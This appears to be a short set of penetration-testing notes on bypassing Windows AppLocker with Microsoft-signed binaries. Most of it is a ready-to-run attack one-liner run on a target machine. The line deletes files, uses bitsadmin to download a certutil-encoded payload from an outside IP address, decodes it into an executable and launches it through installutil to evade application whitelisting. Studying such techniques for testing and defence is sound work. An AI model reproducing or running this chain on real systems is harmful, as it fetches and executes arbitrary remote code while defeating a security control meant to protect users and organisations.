# AppLocker Bypass PowerShell Runspace

We can encode this into a text file with `CertUtil`.

```powershell
certutil -encode C:\Path\To\Binary.exe binary-coded.txt
```

We then run the following oneliner on the target to use the combination of Microsoft-signed binaries to effectively bypass AppLocker.

```powershell
cmd.exe /c del C:\Windows\Tasks\enc.txt && del c:\Windows\Tasks\a.exe && bitsadmin /Transfer theJob http://192.168.49.67/PSRunspace-InvokeRun-certutilCoded.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\a.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\a.exe
```